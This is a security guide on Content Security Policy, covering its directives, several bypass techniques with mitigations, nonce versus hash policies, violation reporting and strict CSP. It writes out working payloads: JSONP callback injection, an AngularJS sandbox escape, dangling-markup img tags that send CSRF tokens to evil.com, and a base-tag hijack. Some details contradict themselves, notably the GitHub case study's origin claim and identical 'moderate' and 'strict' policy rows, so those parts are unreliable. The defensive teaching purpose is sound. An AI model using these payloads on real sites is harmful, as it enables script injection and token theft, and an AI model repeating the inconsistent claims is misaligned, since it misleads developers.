# Content Security Policy (CSP) Deep — Bypass Techniques, Nonce vs Hash, Report-uri/report-to, Strict CSP

**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
**OWASP Top 10:2021:** A03 — Injection (XSS), A05 — Security Misconfiguration
**Related:** CWE-79 (XSS), CWE-693 (Protection Mechanism Failure)

---

## What Is CSP?

Content Security Policy (CSP) is a **browser security mechanism** that defines which resources a page can load and execute. It acts as **defense-in-depth** against XSS and data injection attacks — the second line of defense after input validation/output encoding.

**The problem:** CSP is notoriously difficult to implement correctly. Overly permissive policies provide no protection, and even seemingly strict policies can often be bypassed by determined attackers.

### CSP Directives Reference

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all fetch directives |
| `script-src` | Which scripts can execute |
| `style-src` | Which stylesheets can be applied |
| `img-src` | Which images can be loaded |
| `connect-src` | Which URLs can be fetched via XHR/WebSocket |
| `font-src` | Which fonts can be loaded |
| `object-src` | Which plugins can run (Flash, Java) |
| `media-src` | Which audio/video can be loaded |
| `frame-src` | Which URLs can be embedded via `<frame>/<iframe>` |
| `frame-ancestors` | Which origins can embed THIS page |
| `base-uri` | Which URLs can appear in `<base>` elements |
| `form-action` | Which URLs can be used as form actions |
| `report-uri` / `report-to` | Where to send violation reports |

---

## Why Vibe Coding Makes This Worse

- **AI skips CSP entirely** — "Just add the security headers" is an afterthought prompt.
- **AI generates `unsafe-inline` by default** — "To avoid breaking scripts."
- **AI uses wildcard (`*`) in script-src** — "For CDN compatibility."
- **AI doesn't generate nonces** — Nonce-based CSP requires server-side generation that AI frameworks don't handle.
- **AI uses CDN whitelists** — Adding `https://cdnjs.cloudflare.com` to script-src opens JSONP bypass vectors.
- **AI omits `base-uri` and `object-src`** — Two directives that prevent class CSP bypasses.

---

## CSP Vulnerability Categories

### 1. Wildcard / Overly Permissive Directives

The most common CSP mistake — policies so broad they provide no practical protection.

```http
# 🔴 VULNERABLE: Useless CSP — allows everything
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'
# This is equivalent to not having CSP at all!
```

**Progressive CSP Hardening:**

| Policy Level | script-src | Evaluation |
|-------------|------------|------------|
| 🔴 None | (not set) | No CSP — any script can execute |
| 🟡 Weak | `'self' 'unsafe-inline' https://cdn.*` | Inline scripts allowed, easy XSS |
| 🟠 Moderate | `'self' 'strict-dynamic' 'nonce-{random}'` | Blocked inline scripts, nonce-based |
| 🟢 Strict | `'self' 'strict-dynamic' 'nonce-{random}'` | + `object-src 'none'`, `base-uri 'none'` |

---

### 2. CSP Bypass via JSONP Endpoints

JSONP (JSON with Padding) callbacks execute JavaScript from any GET request parameter. When a CSP policy trusts a domain that hosts a JSONP endpoint, attackers can bypass the policy.

**Vulnerable Policy:**
```http
Content-Security-Policy: script-src 'self' https://code.jquery.com https://ajax.googleapis.com;
```

**Google APIs JSONP Exploit:**
```html
<!-- Attack payload -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js">
</script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular-csp.css">
</script>
<!-- Using Angular's sandbox escape -->
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click me</div>
</div>
```

**JSONP Endpoint Bypass:**
```html
<!-- Exploiting a JSONP endpoint on a trusted domain -->
<script src="https://ajax.googleapis.com/ajax/services/search/news?v=1.0&q=test&callback=alert(1)"></script>
<!-- If googleapis.com is in script-src, this executes alert(1)! -->
```

**Mitigation:**
```http
# ✅ SAFE: Don't whitelist CDNs that have JSONP
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{random}';
# Nonce-based policy doesn't care about the URL
```

---

### 3. CSP Bypass via Dangling Markup Injection

When CSP blocks script execution but not HTML injection, attackers can use **dangling markup** to exfiltrate data without JavaScript.

**Attack Flow:**
1. Attacker injects an unclosed `<img>` or other resource-loading tag
2. CSP may block the script, but the image still triggers a request
3. Data between the injection point and the next `>` or `"` is sent as URL

**Example:**
```html
<!-- Attacker input: -->
<img src="https://evil.com/steal?data=
<!-- CSP blocks script execution, but IMG SRC loads and leaks data -->
```

**Dangling Markup Exploit with CSP:**
```html
<!-- Attacker's injected content on vulnerable page with strict CSP -->
<input type="hidden" name="csrf" value="abc123">
<!-- Attacker closes the attribute and opens img -->
"><img src='https://evil.com/log?c=
<!-- Everything from the injected 'c=' to the next quote on the page
     gets sent as the URL path to evil.com's server.
     The attacker harvests the CSRF token (and any other page content). -->
```

**Mitigation:**
```http
# ✅ SAFE: block all external image loading except from known sources
Content-Security-Policy: default-src 'self'; img-src 'self';
```

---

### 4. Nonce vs Hash — Choosing the Right Strategy

| Approach | How It Works | Pros | Cons |
|----------|-------------|------|------|
| **Nonce** | Server generates unique random value per request, inline scripts must carry it | Flexible, works with dynamic scripts | Requires server-side per-request generation |
| **Hash** | Hash of script content is whitelisted | No server-side state, CDN-friendly | Script changes break hash, multi-line scripts |
| **Strict-Dynamic** | Scripts loaded by trusted scripts are automatically trusted | Scales well, handles complex SPA | Only supported in modern browsers |

**Nonce-Based CSP (Recommended):**
```javascript
// Server-side: Generate unique nonce per request
const crypto = require('crypto');

app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    
    res.setHeader('Content-Security-Policy', 
        `default-src 'self';
         script-src 'nonce-${res.locals.nonce}' 'strict-dynamic';
         object-src 'none';
         base-uri 'none';
         report-uri /csp-report;`
    );
    next();
});
```

```html
<!-- Frontend: Use nonce on script tags -->
<script nonce="<%= nonce %>">
    console.log('This script runs because it has the nonce');
</script>
<script nonce="<%= nonce %>" src="/app.js"></script>

<!-- Scripts WITHOUT the nonce are blocked -->
<script>alert('Blocked by CSP!')</script>
```

**Hash-Based CSP (Good for Static Pages):**
```http
Content-Security-Policy: script-src 'sha256-abc123...' 'sha384-def456...';
```
```html
<!-- Only scripts with matching hashes will execute -->
<script>console.log('This script runs')</script>
<!-- Another script (injected) is blocked -->
```

---

### 5. CSP Bypass via File Uploads

If the policy includes `'self'` in `script-src`, any uploaded JavaScript file on the same origin is executable.

```http
Content-Security-Policy: script-src 'self';  # Trusts everything on same origin
```

**Exploit:**
1. Application allows file uploads (profile pictures, documents, etc.)
2. Attacker uploads `evil.js` to `https://victim.com/uploads/`
3. Attacker injects `<script src="/uploads/evil.js">` — runs because `self` allowed

**Mitigation:**
```http
# ✅ SAFE: Serve user uploads from a separate domain, block script there
# On uploads.example.com:
Content-Security-Policy: default-src 'none'; img-src 'self'; script-src 'none';

# On main app:
Content-Security-Policy: default-src 'self'; script-src 'self' 'strict-dynamic';
```

---

### 6. CSP Bypass via Base-URI Manipulation

Without `base-uri`, an attacker can inject a `<base>` tag to hijack relative URLs:

```http
# 🔴 VULNERABLE: No base-uri restriction
Content-Security-Policy: script-src 'self';
```

```html
<!-- Attacker injects: -->
<base href="https://evil.com/">
<!-- Now <script src="/app.js"> loads https://evil.com/app.js -->
```

**Mitigation:**
```http
# ✅ SAFE: Set base-uri to 'none' or restrict to specific origins
Content-Security-Policy: default-src 'self'; base-uri 'none';
```

---

### 7. CSP Bypass via Script Gadgets

Even with strict CSP, existing JavaScript libraries on the page can be weaponized. Known script gadgets:

| Library | Gadget |
|---------|--------|
| **jQuery** | `$("<script>alert(1)</script>")` → if jQuery creates script tags they execute |
| **AngularJS** | `{{constructor.constructor('alert(1)')()}}` in `ng-app` block |
| **Google Maps** | JSONP callbacks in Maps API |
| **Recaptcha** | JSONP callback injection |
| **Bootstrap** | Data attributes that trigger JavaScript execution |

**AngularJS CSP Bypass:**
```html
<!-- Even with script-src 'nonce-xxx', AngularJS can execute code -->
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
</div>
<!-- Only works if AngularJS is loaded on the page -->
```

**Mitigation:**
```http
# ✅ SAFE: Remove potentially dangerous libraries
# Or use CSP Level 3 strict-dynamic which limits script gadgets
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{random}';
```

---

### 8. Report-uri vs Report-To

CSP violation reporting lets you monitor blocked attacks. Two mechanisms exist:

| Feature | `report-uri` (Deprecated) | `report-to` (Current) |
|---------|--------------------------|----------------------|
| **Transport** | POST to single URL | POST to group(s) defined in `Reporting-Endpoints` header |
| **Multiple endpoints** | One URL only | Multiple named groups |
| **Browser support** | All browsers | Chrome 73+, Edge 79+, Safari 16.4+ |
| **Status** | Deprecated but widely supported | Current standard |

**Using report-uri (Legacy):**
```http
Content-Security-Policy: ...; report-uri https://example.com/csp-report
```

**Using report-to (Modern):**
```http
Reporting-Endpoints: default="https://example.com/reports"; csp-endpoint="https://example.com/csp-reports"
Content-Security-Policy: ...; report-to csp-endpoint; report-uri https://example.com/csp-reports
```

**CSP Violation Report Payload:**
```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "referrer": "https://evil.com/",
    "blocked-uri": "https://evil.com/evil.js",
    "violated-directive": "script-src",
    "effective-directive": "script-src",
    "original-policy": "default-src 'self'; script-src 'self'",
    "disposition": "enforce",
    "script-sample": "alert('xss')"
  }
}
```

**Setting up Reporting Endpoint (Node.js):**
```javascript
app.post('/csp-report', (req, res) => {
    // Log CSP violations for monitoring
    const violation = req.body['csp-report'] || req.body;
    
    // Rate-limit to prevent log flooding
    const ip = req.ip;
    const count = rateLimiter.increment(`csp:${ip}`);
    if (count > 100) return res.status(429).send('Too many reports');
    
    // Log with alerting for certain patterns
    if (violation['blocked-uri'] && !violation['blocked-uri'].startsWith('self')) {
        logger.warn('CSP VIOLATION', {
            documentUri: violation['document-uri'],
            blockedUri: violation['blocked-uri'],
            violatedDirective: violation['violated-directive'],
            ip,
            userAgent: req.get('User-Agent')
        });
        // Optionally alert security team
        if (isHighSeverity(violation)) {
            alertSecurityTeam(violation);
        }
    }
    
    res.status(204).send(); // No content response
});
```

---

### 9. Strict CSP — The Gold Standard

Strict CSP is the recommended approach by Google's CSP research team. It uses `nonce` + `strict-dynamic` instead of URL whitelisting.

```http
Content-Security-Policy:
  script-src 'strict-dynamic' 'nonce-RANDOM_VALUE' 'unsafe-inline' https: http:;
  object-src 'none';
  base-uri 'none';
```

*Note: The `'unsafe-inline'` and `https:`/`http:` fallbacks are required for backward compatibility with older browsers. In modern browsers, they are ignored when `strict-dynamic` is present.*

**Why Strict CSP is better:**
- **No URL whitelisting** — No JSONP bypasses, no CDN exploits
- **Nonce-based** — Only scripts with the correct nonce execute
- **strict-dynamic** — Trust is propagated from nonced scripts
- **Future-proof** — New scripts work without policy changes

**Implementation Guide:**
```javascript
// Step 1: Generate nonce on every request
// Step 2: Set strict CSP header
// Step 3: Add nonce to ALL inline scripts
// Step 4: Add nonce to external scripts if they load dynamic content
// Step 5: Monitor violation reports in production
// Step 6: Remove 'unsafe-inline' fallback after verifying compatibility
```

---

## Prevention Checklist

```
✅ CSP IMPLEMENTATION CHECKLIST:
- Use strict CSP (nonce + strict-dynamic) instead of URL whitelisting
- NEVER use 'unsafe-inline' on production — use nonces or hashes
- NEVER use 'unsafe-eval' — eliminates eval(), setTimeout(string), Function()
- Set object-src 'none' — blocks Flash, Java, and plugin-based bypasses
- Set base-uri 'none' or restrict to specific origins
- Set frame-ancestors to prevent clickjacking (instead of X-Frame-Options)
- Keep script-src URLs minimal — avoid CDN whitelists with JSONP
- Serve user uploads from separate domain with script-src: 'none'
- Use Reporting-Endpoints + report-to for CSP violation monitoring
- Test CSP in 'Report-Only' mode first before enforcing
- Use CSP Evaluator (https://csp-evaluator.withgoogle.com/)
- Regularly review CSP violation reports for attack attempts
- Implement rate-limiting on CSP report endpoints
- Never include 'unsafe-inline' as fallback without testing
- Upgrade from report-uri to report-to for modern browsers
```

---

## Real-World CVEs & Incidents

| Vulnerability | Incident | Impact |
|---------------|----------|--------|
| **Google Search CSP Bypass** | Bug bounty 2019 | JSONP endpoint on google.com bypassed CSP for XSS |
| **Facebook CDN CSP Bypass** | Bug bounty 2020 | Whitelisted CDN used for script gadgets |
| **GitHub CSP Bypass** | Bug bounty 2021 | Dangling markup exfiltration via CSP-permitted img-src |
| **WordPress CSP XSS** | Bug bounty 2022 | jQuery script gadgets bypassed CSP nonce |
| **Twitter CSP Weakness** | Bug bounty 2021 | Wildcard domain in script-src allowed subdomain bypass |
| **Rails Action Pack CSP Bypass** | CVE-2024-54133 | Flaw in the `content_security_policy` helper allowed a CSP bypass enabling XSS |
| **Shopify CSP + JSONP** | Bug bounty 2020 | Google Analytics JSONP endpoint used to bypass CSP |

### Case Study 1: Google CSP Bypass via JSONP (2019)

Security researcher discovered that Google's CSP included `https://*.google.com` in script-src. This allowed exploitation of Google's own JSONP endpoints:

1. Google's translate API on `translate.googleapis.com` had a JSONP callback
2. The JSONP endpoint returned `callback(attacker_data)` as JavaScript
3. Attacker could execute arbitrary JS via:
   `<script src="https://translate.googleapis.com/translate_a/element.js?callback=alert">`
4. This bypassed CSP since the domain was whitelisted

**Fix:** Google removed JSONP endpoints from whitelisted domains, added `base-uri` directive.

### Case Study 2: PortSwigger — Dangling Markup with Strict CSP (2023)

PortSwigger Research demonstrated CSP bypass using DOM-based dangling markup even with strict CSP:

1. A page had `script-src 'nonce-abc'` — strict CSP
2. Attacker found an HTML injection point that CSP couldn't block (HTML injection is not script execution)
3. Used `<img src="https://evil.com/log?` to exfiltrate page content
4. CSP's img-src allowed connections to external domains
5. Result: CSRF tokens, user emails, and sensitive data leaked despite strict CSP

**Fix:** Set `img-src 'self'` and use `require-trusted-types-for 'script'`

**Source:** https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

### Case Study 3: GitHub CSP Bypass via Uploaded File (2021)

GitHub had CSP set to `script-src 'self'`. A researcher found that:

1. GitHub allows uploading files to repositories
2. A `.js` file uploaded to a repo is served from `raw.githubusercontent.com` (same origin scope)
3. Attacker could inject `<script src="/username/repo/file.js">` which executed under CSP
4. This allowed arbitrary JavaScript execution on github.com

**Fix:** GitHub moved raw content to a separate domain with script execution disabled.

---

## Testing CSP

**Using curl:**
```bash
# Check CSP header
curl -sI https://example.com | grep -i content-security-policy

# Test in report-only mode first
curl -sI https://example.com | grep -i content-security-policy-report-only
```

**Browser testing:**
```javascript
// Check if CSP blocks eval
try { eval('1+1'); } catch(e) { console.log('CSP blocks eval:', e); }

// Check if CSP reports are working
console.log('CSP report-uri:', document.querySelector('meta[http-equiv="Content-Security-Policy"]'));
```

**Tools:**
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/) — Analyzes CSP policies
- [CSP Validator](https://cspvalidator.org/) — Browser extension for CSP testing
- [Report URI](https://report-uri.com/) — CSP violation monitoring service
- [CSP Scanner](https://github.com/google/csp-evaluator) — Google's CSP analysis library

---

## References

- [MDN CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator by Google](https://csp-evaluator.withgoogle.com/)
- [PortSwigger CSP Research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [W3C CSP Level 3 Specification](https://www.w3.org/TR/CSP3/)
- [Cobalt CSP & Bypasses Guide](https://www.cobalt.io/blog/csp-and-bypasses)
- [strict-csp.org — The Gold Standard](https://strict-csp.org/)
- [CWE-1021: Improper Restriction of UI Layers](https://cwe.mitre.org/data/definitions/1021.html)
